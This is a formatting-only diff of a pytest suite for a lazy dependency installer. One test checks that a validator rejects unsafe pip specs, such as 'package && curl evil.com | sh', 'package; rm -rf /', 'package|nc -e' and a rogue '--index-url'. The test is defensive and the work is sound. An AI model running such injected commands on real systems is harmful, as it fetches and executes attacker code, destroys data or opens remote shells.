@@ -24,49 +24,54 @@ import tools.lazy_deps as ld
 
 
 class TestSpecSafety:
-    @pytest.mark.parametrize("spec", [
-        "mistralai>=2.3.0,<3",
-        "elevenlabs>=1.0,<2",
-        "honcho-ai>=2.2.0,<3",
-        "boto3>=1.35.0,<2",
-        "mautrix[encryption]>=0.20,<1",
-        "google-api-python-client>=2.100,<3",
-        "youtube-transcript-api>=1.2.0",
-        "qrcode>=7.0,<8",
-        "package",  # bare name, no version
-        "package==1.0.0",
-        "package~=1.0",
-    ])
+    @pytest.mark.parametrize(
+        "spec",
+        [
+            "mistralai>=2.3.0,<3",
+            "elevenlabs>=1.0,<2",
+            "honcho-ai>=2.2.0,<3",
+            "boto3>=1.35.0,<2",
+            "mautrix[encryption]>=0.20,<1",
+            "google-api-python-client>=2.100,<3",
+            "youtube-transcript-api>=1.2.0",
+            "qrcode>=7.0,<8",
+            "package",  # bare name, no version
+            "package==1.0.0",
+            "package~=1.0",
+        ],
+    )
     def test_safe_specs_pass(self, spec):
         assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"
 
-    @pytest.mark.parametrize("spec", [
-        # URL-shaped → rejected (no remote origin override allowed)
-        "git+https://github.com/foo/bar.git",
-        "https://example.com/foo.tar.gz",
-        # File path → rejected
-        "/etc/passwd",
-        "./local-malware",
-        "../escape",
-        # Shell metacharacters → rejected
-        "package; rm -rf /",
-        "package && curl evil.com | sh",
-        "package`whoami`",
-        "package$(whoami)",
-        "package|nc -e",
-        # Pip flag injection → rejected
-        "--index-url=http://evil/",
-        "-r requirements.txt",
-        # Whitespace control chars → rejected
-        "package\nshell-injection",
-        "package\rmore",
-        # Empty / overly long → rejected
-        "",
-        "x" * 500,
-    ])
+    @pytest.mark.parametrize(
+        "spec",
+        [
+            # URL-shaped → rejected (no remote origin override allowed)
+            "git+https://github.com/foo/bar.git",
+            "https://example.com/foo.tar.gz",
+            # File path → rejected
+            "/etc/passwd",
+            "./local-malware",
+            "../escape",
+            # Shell metacharacters → rejected
+            "package; rm -rf /",
+            "package && curl evil.com | sh",
+            "package`whoami`",
+            "package$(whoami)",
+            "package|nc -e",
+            # Pip flag injection → rejected
+            "--index-url=http://evil/",
+            "-r requirements.txt",
+            # Whitespace control chars → rejected
+            "package\nshell-injection",
+            "package\rmore",
+            # Empty / overly long → rejected
+            "",
+            "x" * 500,
+        ],
+    )
     def test_unsafe_specs_rejected(self, spec):
-        assert not ld._spec_is_safe(spec), \
-            f"expected {spec!r} to be rejected"
+        assert not ld._spec_is_safe(spec), f"expected {spec!r} to be rejected"
 
 
 # ---------------------------------------------------------------------------
@@ -91,8 +96,9 @@ class TestAllowlist:
         # the safety regex must accept everything we ship.
         for feature, specs in ld.LAZY_DEPS.items():
             for spec in specs:
-                assert ld._spec_is_safe(spec), \
+                assert ld._spec_is_safe(spec), (
                     f"{feature}: spec {spec!r} fails safety check"
+                )
 
     def test_feature_install_command_returns_pip_invocation(self):
         cmd = ld.feature_install_command("memory.honcho")
@@ -158,7 +164,8 @@ class TestEnsure:
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
         # If pip were called, this would fail loudly.
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda *a, **kw: pytest.fail("pip should not be called"),
         )
         ld.ensure("test.satisfied", prompt=False)  # no exception
@@ -175,7 +182,8 @@ class TestEnsure:
         monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda specs, **kw: ld._InstallResult(True, "ok", ""),
         )
         ld.ensure("test.install", prompt=False)
@@ -185,7 +193,8 @@ class TestEnsure:
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda specs, **kw: ld._InstallResult(
                 False, "", "ERROR: package not found on PyPI"
             ),
@@ -200,7 +209,8 @@ class TestEnsure:
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda specs, **kw: ld._InstallResult(True, "ok", ""),
         )
         with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
@@ -250,6 +260,7 @@ class TestIsSatisfiedVersionAware:
 
         # Patch at the import site lazy_deps uses (inside the function).
         import importlib.metadata as _md
+
         monkeypatch.setattr(_md, "version", _version)
 
     def test_exact_pin_match_returns_true(self, monkeypatch):
@@ -307,7 +318,8 @@ class TestActiveFeatures:
     def test_finds_features_with_at_least_one_package_installed(self, monkeypatch):
         # Pretend only honcho-ai is installed; nothing else.
         monkeypatch.setattr(
-            ld, "_is_present",
+            ld,
+            "_is_present",
             lambda spec: ld._pkg_name_from_spec(spec) == "honcho-ai",
         )
         active = ld.active_features()
@@ -321,7 +333,8 @@ class TestActiveFeatures:
         # for the feature to count as active (user activated it before,
         # one transitive may have been uninstalled separately).
         monkeypatch.setattr(
-            ld, "_is_present",
+            ld,
+            "_is_present",
             lambda spec: ld._pkg_name_from_spec(spec) == "slack-bolt",
         )
         assert "platform.slack" in ld.active_features()
@@ -342,7 +355,9 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(
             ld,
             "_venv_pip_install",
-            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
+            lambda *a, **kw: pytest.fail(
+                "pip should not be called for unsupported Matrix on Windows"
+            ),
         )
 
         result = ld.refresh_active_features()
@@ -357,7 +372,9 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(
             ld,
             "_venv_pip_install",
-            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
+            lambda *a, **kw: pytest.fail(
+                "pip should not be called for unsupported Matrix on Windows"
+            ),
         )
 
         with pytest.raises(ld.FeatureUnavailable, match="unsupported on Windows"):
@@ -371,7 +388,9 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(
             ld,
             "_venv_pip_install",
-            lambda *a, **kw: pytest.fail("pip should not be called when Matrix deps are current"),
+            lambda *a, **kw: pytest.fail(
+                "pip should not be called when Matrix deps are current"
+            ),
         )
 
         ld.ensure("platform.matrix", prompt=False)
@@ -382,7 +401,8 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
         # If pip were called, this would fail loudly.
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda *a, **kw: pytest.fail("pip should not be called"),
         )
         result = ld.refresh_active_features()
@@ -397,7 +417,8 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda specs, **kw: ld._InstallResult(True, "ok", ""),
         )
         result = ld.refresh_active_features()
@@ -410,7 +431,8 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda specs, **kw: ld._InstallResult(
                 False, "", "ERROR: PyPI 404 quarantine"
             ),
@@ -435,14 +457,17 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
         monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
         monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
+
         # a.ok: already satisfied → "current"
         # b.fail: missing + install fails → "failed:"
         def fake_satisfied(spec):
             return ld._pkg_name_from_spec(spec) == "pkga"
+
         monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
         monkeypatch.setattr(
-            ld, "_venv_pip_install",
+            ld,
+            "_venv_pip_install",
             lambda specs, **kw: ld._InstallResult(False, "", "nope"),
         )
         result = ld.refresh_active_features()
